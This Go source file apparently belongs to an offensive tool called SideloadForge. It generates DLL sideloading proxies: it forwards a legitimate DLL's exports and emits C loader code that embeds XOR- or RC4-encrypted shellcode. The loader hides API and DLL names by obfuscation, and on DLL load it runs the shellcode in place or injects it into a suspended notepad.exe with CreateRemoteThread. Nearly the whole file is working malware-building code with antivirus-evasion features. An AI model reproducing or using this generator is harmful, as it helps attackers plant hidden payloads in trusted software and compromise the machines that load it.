package proxy

import (
	"crypto/rand"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/phantom-offensive/SideloadForge/internal/pe"
)

// Config controls proxy DLL generation.
type Config struct {
	OriginalDLL string // path to the legitimate DLL to proxy
	Shellcode   []byte // raw shellcode to embed (from any C2)
	OutDir      string
	RenameBase  string // e.g. "version_orig" (module name, no .dll)
	Arch        string // "x64" (default) or "x86"
	XOR         bool   // XOR-encode the embedded shellcode with a random key
	RC4         bool   // RC4-encrypt the embedded shellcode with a random key
	SleepMs     int    // optional sleep (ms) before running shellcode
	Inject      bool   // run shellcode via process injection (vs self-injection)
	TargetExe   string // injection target path (default: notepad.exe)
	Build       bool   // compile the proxy DLL with mingw immediately
	Compiler    string // optional mingw compiler path (overrides arch default)
}

// Generate emits proxy.c, <name>.def, and a build script into OutDir.
func Generate(cfg Config) ([]string, error) {
	exports, err := pe.Exports(cfg.OriginalDLL)
	if err != nil {
		return nil, err
	}
	if len(exports) == 0 {
		return nil, fmt.Errorf("no named exports found in %s", cfg.OriginalDLL)
	}

	ordinalOnly := 0
	for _, e := range exports {
		if e.ByOrdinal {
			ordinalOnly++
		}
	}
	if ordinalOnly > 0 {
		fmt.Fprintf(os.Stderr, "[!] %d ordinal-only export(s) will be skipped (mingw ld does not support ordinal forwarders); typically unused legacy/internal functions\n", ordinalOnly)
	}

	base := strings.TrimSuffix(filepath.Base(cfg.OriginalDLL), filepath.Ext(cfg.OriginalDLL))
	if cfg.RenameBase == "" {
		cfg.RenameBase = base + "_orig"
	}
	if cfg.Arch == "" {
		cfg.Arch = "x64"
	}
	if cfg.OutDir == "" {
		cfg.OutDir = "."
	}
	if cfg.TargetExe == "" {
		cfg.TargetExe = `C:\Windows\System32\notepad.exe`
	}
	if err := os.MkdirAll(cfg.OutDir, 0755); err != nil {
		return nil, err
	}

	payload := cfg.Shellcode
	var key []byte
	mode := ""
	if cfg.RC4 {
		mode = "rc4"
		key = make([]byte, 16)
		if _, err := rand.Read(key); err != nil {
			return nil, fmt.Errorf("generate rc4 key: %w", err)
		}
		payload = rc4Encode(cfg.Shellcode, key)
	} else if cfg.XOR {
		mode = "xor"
		key = make([]byte, 16)
		if _, err := rand.Read(key); err != nil {
			return nil, fmt.Errorf("generate xor key: %w", err)
		}
		payload = xorEncode(cfg.Shellcode, key)
	}

	cPath := filepath.Join(cfg.OutDir, "proxy.c")
	defPath := filepath.Join(cfg.OutDir, base+".def")
	buildPath := filepath.Join(cfg.OutDir, "build.bat")

	if err := os.WriteFile(cPath, []byte(genC(payload, key, cfg.RenameBase, mode, cfg.SleepMs, cfg.Inject, cfg.TargetExe)), 0644); err != nil {
		return nil, err
	}
	if err := os.WriteFile(defPath, []byte(genDef(base, cfg.RenameBase, exports)), 0644); err != nil {
		return nil, err
	}
	if err := os.WriteFile(buildPath, []byte(genBuild(base, cfg.RenameBase, cfg.Arch, cfg.Compiler)), 0644); err != nil {
		return nil, err
	}

	files := []string{cPath, defPath, buildPath}
	if cfg.Build {
		dllPath, err := buildProxy(cfg.OutDir, base, cfg.Arch, cfg.Compiler)
		if err != nil {
			return files, err
		}
		files = append(files, dllPath)
	}
	return files, nil
}

// buildProxy compiles proxy.c + <name>.def into <name>.dll using mingw.
func buildProxy(outDir, base, arch, compiler string) (string, error) {
	cc := compiler
	if cc == "" {
		cc = "x86_64-w64-mingw32-gcc"
		if arch == "x86" {
			cc = "i686-w64-mingw32-gcc"
		}
	}
	ccPath, err := exec.LookPath(cc)
	if err != nil {
		return "", fmt.Errorf("%s not found in PATH: %w", cc, err)
	}
	dllPath := filepath.Join(outDir, base+".dll")
	cmd := exec.Command(ccPath, "-shared", "-o", dllPath, "proxy.c", base+".def")
	cmd.Dir = outDir
	if out, err := cmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("proxy build failed: %w\n%s", err, out)
	}
	return dllPath, nil
}

func xorEncode(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key[i%len(key)]
	}
	return out
}

func rc4Encode(data, key []byte) []byte {
	out := make([]byte, len(data))
	S := make([]byte, 256)
	for i := range S {
		S[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(S[i]) + int(key[i%len(key)])) % 256
		S[i], S[j] = S[j], S[i]
	}
	i, j := 0, 0
	for k := range data {
		i = (i + 1) % 256
		j = (j + int(S[i])) % 256
		S[i], S[j] = S[j], S[i]
		out[k] = data[k] ^ S[(int(S[i])+int(S[j]))%256]
	}
	return out
}

type apiDef struct {
	Name    string
	Typedef string
	Var     string
}

// apiDefs are the Windows APIs the loader resolves at runtime by hash, so their
// names do not appear as plaintext import strings.
var apiDefs = []apiDef{
	{"VirtualAlloc", "typedef LPVOID (WINAPI *t_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);", "g_VirtualAlloc"},
	{"VirtualProtect", "typedef BOOL (WINAPI *t_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);", "g_VirtualProtect"},
	{"CreateThread", "typedef HANDLE (WINAPI *t_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);", "g_CreateThread"},
	{"Sleep", "typedef VOID (WINAPI *t_Sleep)(DWORD);", "g_Sleep"},
	{"CreateProcessW", "typedef BOOL (WINAPI *t_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);", "g_CreateProcessW"},
	{"VirtualAllocEx", "typedef LPVOID (WINAPI *t_VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);", "g_VirtualAllocEx"},
	{"WriteProcessMemory", "typedef BOOL (WINAPI *t_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);", "g_WriteProcessMemory"},
	{"VirtualProtectEx", "typedef BOOL (WINAPI *t_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);", "g_VirtualProtectEx"},
	{"CreateRemoteThread", "typedef HANDLE (WINAPI *t_CreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);", "g_CreateRemoteThread"},
	{"ResumeThread", "typedef DWORD (WINAPI *t_ResumeThread)(HANDLE);", "g_ResumeThread"},
}

// writeAPIResolution emits typedefs, XOR-encoded API name arrays, a resolve
// helper, and an init_apis() function so the loader resolves VirtualAlloc /
// VirtualProtect / CreateThread / Sleep via GetProcAddress instead of importing
// them by name.
func writeAPIResolution(sb *strings.Builder) {
	key := byte(0)
	for key == 0 {
		b := make([]byte, 1)
		rand.Read(b)
		key = b[0]
	}

	sb.WriteString("/* ---- runtime API resolution ---- */\n")
	for _, d := range apiDefs {
		sb.WriteString(d.Typedef + "\n")
	}
	sb.WriteString("\n")
	for _, d := range apiDefs {
		fmt.Fprintf(sb, "static %s %s;\n", "t_"+d.Name, d.Var)
	}
	sb.WriteString("\n")

	sb.WriteString("static void decode_str(char *dst, const unsigned char *src, unsigned int len, unsigned char k) {\n")
	sb.WriteString("    unsigned int i;\n")
	sb.WriteString("    for (i = 0; i < len; i++) dst[i] = (char)(src[i] ^ k);\n")
	sb.WriteString("    dst[len] = 0;\n")
	sb.WriteString("}\n\n")
	sb.WriteString("static FARPROC resolve_api(HMODULE m, const unsigned char *enc, unsigned int len, unsigned char k) {\n")
	sb.WriteString("    char name[96];\n")
	sb.WriteString("    decode_str(name, enc, len, k);\n")
	sb.WriteString("    return GetProcAddress(m, name);\n")
	sb.WriteString("}\n\n")

	// encoded "kernel32.dll"
	writeEncodedName(sb, "k32_name", "kernel32.dll", key)
	for _, d := range apiDefs {
		writeEncodedName(sb, d.Var+"_enc", d.Name, key)
	}

	fmt.Fprintf(sb, "static void init_apis(void) {\n")
	fmt.Fprintf(sb, "    char name[96];\n")
	fmt.Fprintf(sb, "    HMODULE k32;\n")
	fmt.Fprintf(sb, "    decode_str(name, k32_name, sizeof(k32_name)-1, 0x%02x);\n", key)
	sb.WriteString("    k32 = LoadLibraryA(name);\n")
	sb.WriteString("    if (!k32) return;\n")
	for _, d := range apiDefs {
		fmt.Fprintf(sb, "    %s = (t_%s)resolve_api(k32, %s_enc, sizeof(%s_enc)-1, 0x%02x);\n", d.Var, d.Name, d.Var, d.Var, key)
	}
	sb.WriteString("}\n\n")
}

// writeEncodedName emits `static const unsigned char <var>[] = { … };` holding
// the given string XOR-encoded with key (null terminator stored unencoded).
func writeEncodedName(sb *strings.Builder, varName, s string, key byte) {
	fmt.Fprintf(sb, "static const unsigned char %s[] = {", varName)
	for i := 0; i < len(s); i++ {
		if i > 0 {
			sb.WriteString(",")
		}
		fmt.Fprintf(sb, " 0x%02x", s[i]^key)
	}
	sb.WriteString(", 0x00 };\n")
}

func genC(payload, key []byte, renameBase, mode string, sleepMs int, inject bool, targetExe string) string {
	var sb strings.Builder
	sb.WriteString("/* proxy.c - generated by SideloadForge (C2-agnostic) */\n")
	sb.WriteString("#include <windows.h>\n\n")

	sb.WriteString("unsigned char payload[] = {\n  ")
	writeByteArray(&sb, payload)
	sb.WriteString("\n};\n")
	sb.WriteString("unsigned int payload_len = sizeof(payload);\n")

	if len(key) > 0 {
		sb.WriteString("\nunsigned char key[] = {\n  ")
		writeByteArray(&sb, key)
		sb.WriteString("\n};\n")
		sb.WriteString("unsigned int key_len = sizeof(key);\n")
		if mode == "rc4" {
			sb.WriteString("\nvoid decode(void) {\n")
			sb.WriteString("    unsigned char S[256];\n")
			sb.WriteString("    unsigned int i, j = 0, k, t;\n")
			sb.WriteString("    for (i = 0; i < 256; i++) S[i] = (unsigned char)i;\n")
			sb.WriteString("    for (i = 0; i < 256; i++) {\n")
			sb.WriteString("        j = (j + S[i] + key[i % key_len]) & 0xff;\n")
			sb.WriteString("        t = S[i]; S[i] = S[j]; S[j] = t;\n")
			sb.WriteString("    }\n")
			sb.WriteString("    i = j = 0;\n")
			sb.WriteString("    for (k = 0; k < payload_len; k++) {\n")
			sb.WriteString("        i = (i + 1) & 0xff;\n")
			sb.WriteString("        j = (j + S[i]) & 0xff;\n")
			sb.WriteString("        t = S[i]; S[i] = S[j]; S[j] = t;\n")
			sb.WriteString("        payload[k] ^= S[(S[i] + S[j]) & 0xff];\n")
			sb.WriteString("    }\n")
			sb.WriteString("}\n")
		} else {
			sb.WriteString("\nvoid decode(void) {\n")
			sb.WriteString("    for (unsigned int i = 0; i < payload_len; i++) {\n")
			sb.WriteString("        payload[i] ^= key[i % key_len];\n")
			sb.WriteString("    }\n")
			sb.WriteString("}\n")
		}
	}

	writeAPIResolution(&sb)

	sb.WriteString("DWORD WINAPI run(LPVOID p) {\n")
	if len(key) > 0 {
		sb.WriteString("    decode();\n")
	}
	if sleepMs > 0 {
		fmt.Fprintf(&sb, "    g_Sleep(%d);\n", sleepMs)
	}
	if inject {
		// process injection: spawn a suspended process and run shellcode there
		fmt.Fprintf(&sb, "    STARTUPINFOW si; PROCESS_INFORMATION pi;\n")
		sb.WriteString("    ZeroMemory(&si, sizeof(si)); ZeroMemory(&pi, sizeof(pi));\n")
		sb.WriteString("    si.cb = sizeof(si);\n")
		fmt.Fprintf(&sb, "    if (g_CreateProcessW(L%q, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n", targetExe)
		sb.WriteString("        void *remote = g_VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n")
		sb.WriteString("        if (remote) {\n")
		sb.WriteString("            SIZE_T written = 0;\n")
		sb.WriteString("            if (g_WriteProcessMemory(pi.hProcess, remote, payload, payload_len, &written)) {\n")
		sb.WriteString("                DWORD oldProtect;\n")
		sb.WriteString("                if (g_VirtualProtectEx(pi.hProcess, remote, payload_len, PAGE_EXECUTE_READ, &oldProtect)) {\n")
		sb.WriteString("                    g_CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote, NULL, 0, NULL);\n")
		sb.WriteString("                }\n")
		sb.WriteString("            }\n")
		sb.WriteString("        }\n")
		sb.WriteString("        g_ResumeThread(pi.hThread);\n")
		sb.WriteString("    }\n")
	} else {
		sb.WriteString("    LPVOID mem = g_VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n")
		sb.WriteString("    if (mem) {\n")
		sb.WriteString("        for (unsigned int i = 0; i < payload_len; i++) ((unsigned char*)mem)[i] = payload[i];\n")
		sb.WriteString("        DWORD oldProtect;\n")
		sb.WriteString("        g_VirtualProtect(mem, payload_len, PAGE_EXECUTE_READ, &oldProtect);\n")
		sb.WriteString("        ((void(*)())mem)();\n")
		sb.WriteString("    }\n")
	}
	sb.WriteString("    return 0;\n")
	sb.WriteString("}\n\n")
	if renameBase != "" {
		writeObfuscatedName(&sb, renameBase+".dll")
	}
	sb.WriteString("BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {\n")
	sb.WriteString("    if (fdwReason == DLL_PROCESS_ATTACH) {\n")
	sb.WriteString("        init_apis();\n")
	if renameBase != "" {
		sb.WriteString("        decode_name();\n")
		sb.WriteString("        LoadLibraryA((char*)orig_name);\n")
	}
	sb.WriteString("        g_CreateThread(NULL, 0, run, NULL, 0, NULL);\n")
	sb.WriteString("    }\n")
	sb.WriteString("    return TRUE;\n")
	sb.WriteString("}\n")
	return sb.String()
}

// writeObfuscatedName emits an XOR-encoded C string (single random key) plus a
// decode_name() helper, so the original DLL name isn't a plaintext string in the
// generated source.
func writeObfuscatedName(sb *strings.Builder, name string) {
	key := byte(0)
	for key == 0 {
		b := make([]byte, 1)
		rand.Read(b)
		key = b[0]
	}
	sb.WriteString("unsigned char orig_name[] = {\n  ")
	for i := 0; i < len(name); i++ {
		if i > 0 {
			sb.WriteString(" ")
		}
		fmt.Fprintf(sb, "0x%02x,", name[i]^key)
	}
	sb.WriteString(" 0x00\n};\n")
	fmt.Fprintf(sb, "void decode_name(void) {\n    for (unsigned int i = 0; i < sizeof(orig_name) - 1; i++) orig_name[i] ^= 0x%02x;\n}\n\n", key)
}

func writeByteArray(sb *strings.Builder, data []byte) {
	for i, b := range data {
		if i > 0 {
			if i%16 == 0 {
				sb.WriteString("\n  ")
			} else {
				sb.WriteString(" ")
			}
		}
		fmt.Fprintf(sb, "0x%02x,", b)
	}
}

func genDef(base, renameBase string, exports []pe.Export) string {
	var sb strings.Builder
	fmt.Fprintf(&sb, "LIBRARY %s\n", base)

	var skipped []uint32
	for _, e := range exports {
		if e.ByOrdinal {
			skipped = append(skipped, e.Ordinal)
		}
	}
	if len(skipped) > 0 {
		sb.WriteString("; NOTE: ordinal-only exports skipped (mingw ld does not support ordinal forwarders):")
		for _, o := range skipped {
			fmt.Fprintf(&sb, " %d", o)
		}
		sb.WriteString("\n")
	}

	sb.WriteString("EXPORTS\n")
	for _, e := range exports {
		if e.ByOrdinal {
			continue
		}
		fmt.Fprintf(&sb, "    %s = %s.%s @%d\n", e.Name, renameBase, e.Name, e.Ordinal)
	}
	return sb.String()
}

func genBuild(base, renameBase, arch, compiler string) string {
	cc := compiler
	if cc == "" {
		cc = "x86_64-w64-mingw32-gcc"
		if arch == "x86" {
			cc = "i686-w64-mingw32-gcc"
		}
	}
	return fmt.Sprintf(
		"@echo off\nREM 1) rename the real %[1]s.dll to %[2]s.dll\nREM 2) run this script to build the proxy %[1]s.dll\n%[3]s -shared -o %[1]s.dll proxy.c %[1]s.def\n",
		base, renameBase, cc)
}
